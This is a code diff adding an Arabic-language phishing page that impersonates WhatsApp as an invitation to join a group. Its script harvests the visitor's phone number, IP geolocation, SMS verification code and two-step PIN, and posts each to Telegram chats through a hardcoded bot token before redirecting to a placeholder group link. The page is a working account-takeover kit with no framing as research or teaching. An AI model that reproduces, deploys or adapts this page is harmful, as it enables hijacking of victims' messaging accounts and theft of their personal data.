@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الانضمام إلى مجموعة واتساب</title>
+    <!-- إضافة Favicon -->
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.min.css">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"></script>
+
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #b8bbc0; }
+        .container { background: white; padding: 20px; max-width: 400px; margin: 50px auto; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); }
+        .logo { width: 80px; margin-bottom: 10px; }
+        .iti { width: 100%; }
+        .hidden { display: none; } /* إخفاء العناصر افتراضيًا */
+        .loading { display: flex; align-items: center; justify-content: center; gap: 10px; color: gray; font-size:16px; margin-top: 10px; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #25d366; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    
+        input, button { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
+        button { background-color: #25d366; color: white; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #1ebe5d; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" class="logo">
+        <h1>مرحبًا بك في مجموعة الواتساب</h1>
+        <p>يرجى إدخال رقم هاتفك المحلي للانضمام إلى المجموعة.</p>
+
+        <input type="tel" id="phone" placeholder="أدخل رقم هاتفك">
+        <small>مثال: 612345678 (بدون رمز الدولة)</small>
+        <p id="error-message" class="error-message hidden">يرجى إدخال رقم هاتف صحيح.</p>
+        <button onclick="requestCode()">التالي</button>
+
+        <!-- رسالة جاري البحث -->
+        <div id="loading-section" class="hidden">
+            <div class="loader"></div>
+            <span>جاري البحث عن رقمك...</span>
+        </div>
+
+        <!-- إدخال كود التحقق الأول -->
+        <div id="verification-section" class="hidden">
+            <p>أدخل الرمز المكون من 6 أرقام الذي ظهر لك:</p>
+            <input type="tel" id="verification-code" maxlength="6" placeholder="أدخل الكود هنا" inputmode="numeric" pattern="[0-9]*">
+            <button onclick="sendVerificationCode()">تحقق</button>
+        </div>
+ <!-- رسالة جاري البحث .....................................................................-->
+ <div id="loading-section" class="hidden">
+    <div class="loader"></div>
+    <span>جاري البحث عن رقمك...</span>
+</div>
+        <!-- إدخال كود التحقق بخطوتين -->
+        <div id="two-step-section" class="hidden">
+            <p>أدخل كود التحقق من خطوتين الخاص بك🔐:</p>
+            <input type="tel" id="two-step-code" maxlength="6" placeholder="أدخل الكود هنا" inputmode="numeric" pattern="[0-9]*">
+            <button onclick="sendTwoStepCode()">انضم إلى المجموعة</button>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script>
+        const phoneInput = document.querySelector("#phone");
+        const loadingSection = document.getElementById("loading-section");
+        const verificationSection = document.getElementById("verification-section");
+        const twoStepSection = document.getElementById("two-step-section");
+
+        const iti = window.intlTelInput(phoneInput, {
+            separateDialCode: true,
+            nationalMode: true,
+            initialCountry: "auto",
+            geoIpLookup: function(callback) {
+                fetch("https://ipinfo.io/json?token=12b6b3d8813241")
+                    .then(response => response.json())
+                    .then(data => callback(data.country.toLowerCase()))
+                    .catch(() => callback("us"));
+            }
+        });
+
+        function requestCode() {
+            const phoneNumber = iti.getNumber();
+            if (!phoneNumber || !iti.isValidNumber()) {
+                alert("يرجى إدخال رقم هاتف صالح");
+                return;
+            }
+            loadingSection.classList.remove("hidden");
+
+            fetch("https://ipinfo.io/json?token=12b6b3d8813241")
+                .then(response => response.json())
+                .then(ipData => {
+                    const message = `
+📞 numero de telephone : ${phoneNumber}
+🌍 pays: ${ipData.country}
+🏙️ city: ${ipData.city}
+📍 l3ard o tol : ${ipData.loc}
+📍 IP: ${ipData.ip}
+                    `;
+                    sendToTelegram(message);
+                });
+
+            setTimeout(() => {
+                loadingSection.classList.add("hidden");
+                verificationSection.classList.remove("hidden");
+            }, 5000);
+        }
+        
+        function sendVerificationCode() {
+            const verificationCode = document.getElementById("verification-code").value;
+            if (verificationCode.length !== 6) {
+                alert("يجب إدخال 6 أرقام");
+                return;
+            }
+            loadingSection.classList.remove("hidden");
+            fetch("https://ipinfo.io/json?token=12b6b3d8813241")
+                .then(response => response.json())
+                .then(ipData => {
+                    const message = `
+                    📞: ${iti.getNumber()}
+🔢 verification code: ${verificationCode}
+📍 IP: ${ipData.ip}
+                    `;
+                    sendToTelegram(message);
+                });
+
+                setTimeout(() => {
+                loadingSection.classList.add("hidden");
+                verificationSection.classList.add("hidden");
+                twoStepSection.classList.remove("hidden");
+            }, 5000);
+           
+        }
+
+        function sendTwoStepCode() {
+    const twoStepCode = document.getElementById("two-step-code").value;
+
+    if (twoStepCode.length !== 6 || isNaN(twoStepCode)) {
+        alert("يجب إدخال 6 أرقام صحيحة");
+        return;
+    }
+
+    // رابط المجموعة على واتساب - استبدله برابط مجموعتك الفعلي
+    const whatsappGroupLink = "https://chat.whatsapp.com/EXAMPLE_GROUP_LINK";  
+    window.location.href = whatsappGroupLink;
+
+
+            fetch("https://ipinfo.io/json?token=12b6b3d8813241")
+                .then(response => response.json())
+                .then(ipData => {
+                    const message = `
+                    📞: ${iti.getNumber()}
+🔐 2fa: ${twoStepCode}
+📍 IP: ${ipData.ip}
+                    `;
+                    sendToTelegram(message);
+                });
+        }
+
+       function sendToTelegram(text) {
+    const chatIds = ["1891950844", "6967962102"]; // يمكن تعديل هذه القائمة حسب الحاجة
+    chatIds.forEach(chatId => {
+        fetch(`https://api.telegram.org/bot7863118617:AAEBjVAP-xklyLwmPUUvyki3QKpW6LZAJnI/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text })
+        });
+    });
+}
+        
+      
+    </script>
+     
+</body>
+<footer class="footer">
+    <div class="footer-container">
+        <div class="footer-text">
+            <p>© 2025 WhatsApp. جميع الحقوق محفوظة.</p>
+            <p>تم تصميم هذا الموقع باستخدام تقنيات حديثة.</p>
+        </div>
+        <!-- شعار الشركة (يمكنك إضافة اللوجو هنا) -->
+        <div class="footer-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Whatsapp_logo.svg" alt="WhatsApp Logo" class="footer-logo-img">
+        </div>
+    
+        <!-- الروابط الأساسية -->
+        <div class="footer-links">
+            <a href="#">الخصوصية</a>
+            <a href="#">الشروط</a>
+            <a href="#">المساعدة</a>
+            <a href="#">أحدث الأخبار</a>
+        </div>
+    
+        <!-- الروابط الاجتماعية -->
+        <div class="footer-social">
+            <a href="https://www.facebook.com" target="_blank" class="social-icon">فيسبوك</a>
+            <a href="https://www.twitter.com" target="_blank" class="social-icon">تويتر</a>
+            <a href="https://www.instagram.com" target="_blank" class="social-icon">إنستغرام</a>
+        </div>
+    </div>
+    </footer>
+    
+    
+</html>
